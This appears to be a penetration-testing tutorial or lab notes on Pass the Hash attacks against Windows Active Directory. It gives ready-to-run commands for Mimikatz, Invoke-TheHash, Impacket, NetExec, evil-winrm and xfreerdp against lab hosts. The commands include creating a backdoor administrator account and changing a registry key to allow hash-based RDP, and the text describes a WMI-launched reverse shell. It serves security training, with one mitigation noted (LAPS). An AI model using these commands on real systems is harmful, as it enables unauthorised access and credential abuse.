A Pass the Hash (PtH) attack allows an attacker to authenticate using an NTLM password hash instead of the plaintext password, without cracking it. The attack works because the password hash remains valid for authentication until the password is changed. Attackers typically obtain these hashes from the SAM database, the NTDS.dit database, or the LSASS process after compromising a system.

NTLM is a legacy Windows authentication protocol that uses a challenge-response mechanism to verify users without transmitting plaintext passwords. Because NTLM password hashes are not salted, an attacker can authenticate using the hash alone without knowing the original password. This weakness enables Pass the Hash (PtH) attacks, although Kerberos is now the default authentication protocol in Active Directory.

## Pass the Hash with Mimikatz (Windows)

[Mimikatz](https://github.com/gentilkiwi/mimikatz) can perform Pass the Hash attacks using the `sekurlsa::pth` module, which starts a process under the context of a user by supplying their NTLM hash instead of the password. The attack requires the target username, NTLM hash, domain (or local computer name), and optionally the program to execute, such as `cmd.exe`.

```powershell
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a PowerShell tool that performs Pass the Hash attacks over SMB or WMI by authenticating with an NTLM hash instead of a plaintext password. It requires the target's hostname or IP, valid user credentials (username, domain, and NTLM hash), and administrative privileges on the target system. Once authenticated, it can execute commands remotely, such as creating users or performing administrative tasks. An example over SMB:

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add"
```

`Invoke-TheHash` can also execute remote commands over WMI by authenticating with an NTLM hash instead of a plaintext password. A common technique is to generate a Base64-encoded PowerShell reverse shell using **PowerShell #3 (Base64)** from [revshells.com](https://revshells.com). The encoded payload is passed as the command to `Invoke-WMIExec`, allowing it to be executed remotely on the target. If a Netcat listener is waiting on the attacker's machine, the target connects back and establishes a reverse shell. This approach combines Pass the Hash authentication with WMI-based remote execution to obtain interactive access to the compromised system.

## Pass the Hash with Impacket (Linux)

Impacket provides several tools that support Pass the Hash attacks for remote command execution and other post-exploitation tasks. One of the most common is [impacket-psexec](https://github.com/fortra/impacket), which authenticates with an NTLM hash and creates a temporary service on the target to obtain an interactive shell. Besides `psexec`, Impacket also includes alternatives such as `wmiexec`, `atexec`, and `smbexec`, each using a different remote execution method. These tools allow attackers to execute commands on remote Windows systems without knowing the user's plaintext password.

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash with NetExec (Linux)

NetExec is a post-exploitation tool that automates authentication and security assessments across Active Directory environments. It can use Pass the Hash to test credentials against multiple hosts, helping identify systems where the attacker has local administrator access. This technique is often associated with password spraying, although repeated authentication attempts against domain accounts may trigger account lockouts. To reduce this risk, attackers can target local accounts, limiting authentication attempts to a single login per host.

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Using the `--local-auth` option, NetExec attempts Pass the Hash authentication against local administrator accounts instead of domain accounts, making it useful for identifying password reuse across multiple hosts. If the output displays **Pwn3d!**, it indicates that the supplied hash has local administrator privileges on the target system, and the `-x` option can then be used to execute remote commands. Local administrator password reuse is a common weakness caused by shared system images or identical passwords across endpoints. A recommended mitigation is implementing **Microsoft Local Administrator Password Solution (LAPS)**, which assigns unique, regularly rotated passwords to local administrator accounts.

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) supports Pass the Hash authentication over Windows Remote Management (WinRM), allowing attackers to obtain a remote PowerShell session using an NTLM hash. It is a useful alternative when SMB is unavailable or when WinRM is the preferred remote management protocol on the target system.

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash with RDP (Linux)

Pass the Hash can also be used to authenticate over RDP with tools such as `xfreerdp`, providing graphical access to the target system. This attack requires **Restricted Admin Mode** to be enabled on the target, which can be configured by setting the `DisableRestrictedAdmin` registry key to `0` under `HKLM\System\CurrentControlSet\Control\Lsa`; otherwise, RDP authentication with an NTLM hash will fail.

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
